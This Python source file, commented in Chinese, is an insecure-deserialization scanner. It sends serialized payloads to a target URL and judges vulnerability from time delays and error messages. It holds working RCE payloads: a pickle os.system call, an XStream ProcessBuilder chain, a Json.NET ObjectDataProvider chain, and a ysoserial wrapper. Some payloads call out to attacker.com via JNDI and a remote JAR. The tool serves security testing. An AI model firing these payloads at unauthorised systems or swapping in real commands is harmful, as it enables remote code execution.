"""
不安全反序列化檢測器 (增強版)
OWASP A08:2021 - Software and Data Integrity Failures

基於 Java Deserialization Cheat Sheet 和 OWASP 指南的檢測實現
支持多種語言和序列化格式的檢測
"""

import time
import base64
import subprocess
from typing import List, Optional
from dataclasses import dataclass
import requests


@dataclass
class DeserializationFinding:
    """反序列化漏洞發現結果"""
    type: str
    parameter: str
    language: str
    payload_type: str
    severity: str
    owasp: str
    evidence: str
    success: bool
    gadget_chain: Optional[str] = None


class DeserializationDetector:
    """不安全反序列化檢測器"""
    
    # Java serialization 魔數
    JAVA_SERIALIZED_MAGIC = b"\xac\xed\x00\x05"
    
    # OWASP 類別常量
    OWASP_A08_2021 = 'A08:2021'
    
    # JSON.NET $type 字段
    JSON_TYPE_FIELD = "$type"
    
    # ysoserial 支持的 gadget chains (按優先級排序)
    JAVA_GADGETS = [
        'CommonsCollections1',   # commons-collections:3.1
        'CommonsCollections2',   # commons-collections4:4.0
        'CommonsCollections3',   # commons-collections:3.1
        'CommonsCollections4',   # commons-collections4:4.0
        'CommonsCollections5',   # commons-collections:3.1
        'CommonsCollections6',   # commons-collections:3.1
        'CommonsCollections7',   # commons-collections:3.1
        'Spring1',               # spring-core:4.1.4, spring-beans:4.1.4
        'Spring2',               # spring-core:4.1.4, spring-aop:4.1.4
        'ROME',                  # rome:1.0
        'Jdk7u21',              # JRE only
        'Hibernate1',           # hibernate-core
        'C3P0',                 # c3p0:0.9.5.2
        'BeanShell1',           # bsh:2.0b5
        'Groovy1',              # groovy:2.3.9
        'Jython1',              # jython-standalone:2.5.2
    ]
    
    def __init__(self, ysoserial_path: Optional[str] = None, timeout: int = 10):
        """
        初始化檢測器
        
        Args:
            ysoserial_path: ysoserial.jar 的路徑 (可選)
            timeout: 請求超時時間(秒)
        """
        self.ysoserial_path = ysoserial_path or ""
        self.timeout = timeout
    
    def generate_java_payload_with_ysoserial(
        self, 
        gadget: str, 
        command: str = 'sleep 5'
    ) -> Optional[bytes]:
        """
        使用 ysoserial 生成 Java 反序列化 payload
        
        Args:
            gadget: Gadget chain 名稱
            command: 要執行的命令
            
        Returns:
            Base64 編碼的 payload,失敗返回 None
        """
        if not self.ysoserial_path:
            return None
        
        try:
            result = subprocess.run(
                ['java', '-jar', self.ysoserial_path, gadget, command],
                capture_output=True,
                timeout=5
            )
            
            if result.returncode == 0:
                return base64.b64encode(result.stdout)
            
        except Exception as e:
            print(f"Error generating payload with ysoserial: {e}")
        
        return None
    
    def generate_detection_payloads(self, language: str) -> dict[str, bytes]:
        """
        生成檢測性 payloads (不執行真實攻擊)
        
        Args:
            language: 目標語言 ('java', 'python', 'php', 'dotnet')
            
        Returns:
            {payload_type: payload_bytes} 字典
        """
        payloads = {}
        
        if language == 'java':
            # Java Native Serialization
            payloads['java_serialized'] = self._create_java_detection_payload()
            
            # Jackson (JSON)
            payloads['jackson_jndi'] = self._create_jackson_payload()
            
            # Fastjson
            payloads['fastjson'] = self._create_fastjson_payload()
            
            # XStream (XML)
            payloads['xstream'] = self._create_xstream_payload()
            
            # Kryo (binary)
            payloads['kryo'] = self._create_kryo_detection_payload()
            
            # Hessian (binary)
            payloads['hessian'] = self._create_hessian_detection_payload()
            
            # SnakeYAML
            payloads['snakeyaml'] = self._create_snakeyaml_payload()
            
        elif language == 'python':
            payloads['pickle'] = self._create_python_pickle_payload()
            payloads['pyyaml'] = self._create_pyyaml_payload()
            payloads['jsonpickle'] = self._create_jsonpickle_payload()
            
        elif language == 'php':
            payloads['php_serialize'] = self._create_php_payload()
            
        elif language == 'dotnet':
            payloads['binaryformatter'] = self._create_dotnet_binaryformatter_payload()
            payloads['jsonnet_typenamehandling'] = self._create_jsonnet_payload()
        
        return payloads
    
    def _create_java_detection_payload(self) -> bytes:
        """
        創建 Java 檢測 payload
        
        這是一個包含 Java 序列化魔數的最小 payload
        用於檢測目標是否接受序列化數據
        """
        # 最小的 Java 序列化對象
        payload = self.JAVA_SERIALIZED_MAGIC + b"\x73\x72\x00\x0djava.lang.String"
        return base64.b64encode(payload)
    
    def _create_jackson_payload(self) -> bytes:
        """
        Jackson JSON payload (JNDI injection)
        
        基於 CVE-2017-7525 和後續繞過
        """
        import json
        
        # 使用 Spring 的 JdbcRowSetImpl 進行 JNDI 注入
        payload = {
            "@class": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://attacker.com:1389/Exploit",
            "autoCommit": True
        }
        
        return json.dumps(payload).encode()
    
    def _create_fastjson_payload(self) -> bytes:
        """
        Fastjson payload
        
        基於 CVE-2017-18349 和多次黑名單繞過
        """
        import json
        
        # Fastjson 1.2.47 繞過
        payload = {
            "@type": "java.lang.Class",
            "val": "com.sun.rowset.JdbcRowSetImpl"
        }
        
        return json.dumps(payload).encode()
    
    def _create_xstream_payload(self) -> bytes:
        """
        XStream XML payload
        
        基於 CVE-2013-7285
        """
        xml = '''<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <filter class="javax.imageio.ImageIO$ContainsFilter">
                      <method>
                        <class>java.lang.ProcessBuilder</class>
                        <name>start</name>
                        <parameter-types/>
                      </method>
                      <name>sleep</name>
                    </filter>
                    <next class="string">foo</next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>sleep</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>'''
        return xml.encode()
    
    def _create_kryo_detection_payload(self) -> bytes:
        """Kryo binary format 檢測 payload"""
        # Kryo 不像 Java 有固定魔數,使用測試數據
        return b"kryo_test_data"
    
    def _create_hessian_detection_payload(self) -> bytes:
        """Hessian binary format 檢測 payload"""
        # Hessian 2.0 格式
        # 'H' (version 2.0) + 0x02
        return b"H\x02\x00"
    
    def _create_snakeyaml_payload(self) -> bytes:
        """
        SnakeYAML payload
        
        基於 CVE-2017-18640
        """
        yaml = '''!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/evil.jar"]
  ]]
]'''
        return yaml.encode()
    
    def _create_python_pickle_payload(self) -> bytes:
        """
        Python pickle payload
        
        使用 __reduce__ 方法執行命令
        """
        import pickle
        
        class RCE:
            def __reduce__(self):
                import os
                # 檢測性命令 - sleep 5 秒
                return (os.system, ('sleep 5',))
        
        payload = pickle.dumps(RCE())
        return base64.b64encode(payload)
    
    def _create_pyyaml_payload(self) -> bytes:
        """PyYAML payload"""
        yaml = '''!!python/object/apply:time.sleep
args: [5]'''
        return yaml.encode()
    
    def _create_jsonpickle_payload(self) -> bytes:
        """jsonpickle payload"""
        import json
        payload = {
            "py/reduce": [
                {"py/type": "os.system"},
                {"py/tuple": ["sleep 5"]}
            ]
        }
        return json.dumps(payload).encode()
    
    def _create_php_payload(self) -> bytes:
        """
        PHP 反序列化 payload
        
        利用魔術方法 __wakeup/__destruct
        """
        # 示例: O:8:"Evil":1:{s:4:"cmd";s:7:"sleep 5";}
        # 實際需要根據目標類調整
        php = 'O:8:"stdClass":1:{s:4:"test";s:11:"sleep 5";}'
        return php.encode()
    
    def _create_dotnet_binaryformatter_payload(self) -> bytes:
        """
        .NET BinaryFormatter payload
        
        Note: 需要 ysoserial.net 工具
        """
        # .NET serialization 魔數
        magic = b"\x00\x01\x00\x00\x00"
        return base64.b64encode(magic + b"BinaryFormatter")
    
    def _create_jsonnet_payload(self) -> bytes:
        """
        Json.NET payload (TypeNameHandling)
        
        基於 CVE-2017-9822
        """
        import json
        payload = {
            self.JSON_TYPE_FIELD: "System.Windows.Data.ObjectDataProvider, PresentationFramework",
            "MethodName": "Start",
            "MethodParameters": {
                self.JSON_TYPE_FIELD: "System.Collections.ArrayList, mscorlib",
                "$values": ["cmd", "/c", "ping", "attacker.com"]
            },
            "ObjectInstance": {
                self.JSON_TYPE_FIELD: "System.Diagnostics.Process, System"
            }
        }
        return json.dumps(payload).encode()
    
    def test_deserialization(
        self,
        url: str,
        param: str,
        language: str,
        method: str = 'POST',
        inject_point: str = 'param'  # 'param', 'cookie', 'header'
    ) -> List[DeserializationFinding]:
        """
        測試反序列化漏洞
        
        檢測技術:
        1. Time-based detection (命令延遲)
        2. Error-based detection (錯誤消息)
        3. DNS/HTTP callback detection (OOB)
        
        Args:
            url: 目標 URL
            param: 參數/Cookie/Header 名稱
            language: 目標語言
            method: HTTP 方法
            inject_point: 注入點類型
            
        Returns:
            發現的漏洞列表
        """
        findings = []
        payloads = self.generate_detection_payloads(language)
        
        # 測量基準響應時間
        baseline_time = self._measure_baseline(url, method)
        
        for payload_type, payload in payloads.items():
            finding = self._test_single_payload(
                url, param, payload, payload_type, language, 
                method, inject_point, baseline_time
            )
            
            if finding:
                findings.append(finding)
                # 找到嚴重漏洞就停止
                if finding.severity == 'Critical' and finding.success:
                    break
        
        return findings
    
    def _measure_baseline(self, url: str, method: str, samples: int = 3) -> float:
        """
        測量基準響應時間 (多次採樣取平均)
        
        Args:
            url: 目標 URL
            method: HTTP 方法
            samples: 採樣次數
            
        Returns:
            平均響應時間(秒)
        """
        times = []
        
        for _ in range(samples):
            try:
                start = time.time()
                if method.upper() == 'POST':
                    requests.post(url, data={}, timeout=self.timeout)
                else:
                    requests.get(url, timeout=self.timeout)
                times.append(time.time() - start)
            except Exception:
                pass
        
        return sum(times) / len(times) if times else 1.0
    
    def _test_single_payload(
        self,
        url: str,
        param: str,
        payload: bytes,
        payload_type: str,
        language: str,
        method: str,
        inject_point: str,
        baseline_time: float
    ) -> Optional[DeserializationFinding]:
        """
        測試單個 payload
        
        Returns:
            發現的漏洞,沒有則返回 None
        """
        start_time = time.time()
        
        try:
            # 準備請求參數
            if inject_point == 'param':
                if method.upper() == 'POST':
                    resp = requests.post(
                        url,
                        data={param: payload.decode('utf-8', errors='ignore')},
                        timeout=self.timeout
                    )
                else:
                    resp = requests.get(
                        url,
                        params={param: payload.decode('utf-8', errors='ignore')},
                        timeout=self.timeout
                    )
            
            elif inject_point == 'cookie':
                resp = requests.get(
                    url,
                    cookies={param: payload.decode('utf-8', errors='ignore')},
                    timeout=self.timeout
                )
            
            elif inject_point == 'header':
                resp = requests.get(
                    url,
                    headers={param: payload.decode('utf-8', errors='ignore')},
                    timeout=self.timeout
                )
            
            response_time = time.time() - start_time
            
            # 1. Time-based 檢測 (命令延遲)
            if response_time > baseline_time + 4.5:
                return DeserializationFinding(
                    type='Insecure Deserialization (Time-Based)',
                    parameter=param,
                    language=language,
                    payload_type=payload_type,
                    severity='Critical',
                    owasp=self.OWASP_A08_2021,
                    evidence=f'Significant time delay: {response_time:.2f}s (baseline: {baseline_time:.2f}s)',
                    success=True,
                    gadget_chain=payload_type
                )
            
            # 2. Error-based 檢測
            if self._check_deserialization_error(resp.text, language):
                return DeserializationFinding(
                    type='Insecure Deserialization (Error-Based)',
                    parameter=param,
                    language=language,
                    payload_type=payload_type,
                    severity='High',
                    owasp=self.OWASP_A08_2021,
                    evidence=f'Deserialization error detected: {resp.text[:200]}',
                    success=False,
                    gadget_chain=payload_type
                )
            
            # 3. 檢查異常 HTTP 狀態碼
            if resp.status_code == 500:
                error_keywords = ['deserialize', 'unmarshal', 'pickle', 'unserialize']
                if any(keyword in resp.text.lower() for keyword in error_keywords):
                    return DeserializationFinding(
                        type='Insecure Deserialization (HTTP 500)',
                        parameter=param,
                        language=language,
                        payload_type=payload_type,
                        severity='Medium',
                        owasp=self.OWASP_A08_2021,
                        evidence=f'HTTP 500 with deserialization error: {resp.text[:200]}',
                        success=False,
                        gadget_chain=payload_type
                    )
        
        except requests.exceptions.Timeout:
            # 超時 - 可能是成功的 RCE
            return DeserializationFinding(
                type='Insecure Deserialization (Timeout)',
                parameter=param,
                language=language,
                payload_type=payload_type,
                severity='High',
                owasp=self.OWASP_A08_2021,
                evidence=f'Request timed out after {self.timeout}s - possible RCE',
                success=False,
                gadget_chain=payload_type
            )
        
        except requests.exceptions.ConnectionError:
            # 連接錯誤 - 服務器可能崩潰
            return DeserializationFinding(
                type='Insecure Deserialization (Connection Error)',
                parameter=param,
                language=language,
                payload_type=payload_type,
                severity='Medium',
                owasp=self.OWASP_A08_2021,
                evidence='Connection error - server may have crashed',
                success=False,
                gadget_chain=payload_type
            )
        
        except Exception:
            # 其他錯誤 - 靜默處理
            pass
        
        return None
    
    def _check_deserialization_error(self, response_text: str, language: str) -> bool:
        """
        檢查響應中是否包含反序列化錯誤消息
        
        Args:
            response_text: 響應文本
            language: 目標語言
            
        Returns:
            是否檢測到反序列化錯誤
        """
        error_patterns = {
            'java': [
                'java.io.ObjectInputStream',
                'readObject',
                'ClassNotFoundException',
                'InvalidClassException',
                'StreamCorruptedException',
                'SerializationException',
                'com.thoughtworks.xstream',
                'com.fasterxml.jackson',
                'com.alibaba.fastjson',
                'org.yaml.snakeyaml',
                'com.esotericsoftware.kryo',
                'com.caucho.hessian',
            ],
            'python': [
                'pickle.loads',
                'pickle.Unpickler',
                '_pickle.UnpicklingError',
                'yaml.load',
                '__reduce__',
                '__setstate__',
                'jsonpickle',
            ],
            'php': [
                'unserialize()',
                '__wakeup',
                '__destruct',
                '__toString',
                'unserialize(): Error',
                'PDOException',
            ],
            'dotnet': [
                'BinaryFormatter',
                'Deserialize',
                'SerializationException',
                'TypeNameHandling',
                'JsonConvert.DeserializeObject',
                'System.Runtime.Serialization',
            ]
        }
        
        patterns = error_patterns.get(language, [])
        text_lower = response_text.lower()
        
        # 至少匹配 2 個模式才認為是反序列化錯誤
        matches = sum(1 for pattern in patterns if pattern.lower() in text_lower)
        return matches >= 2


# 使用示例

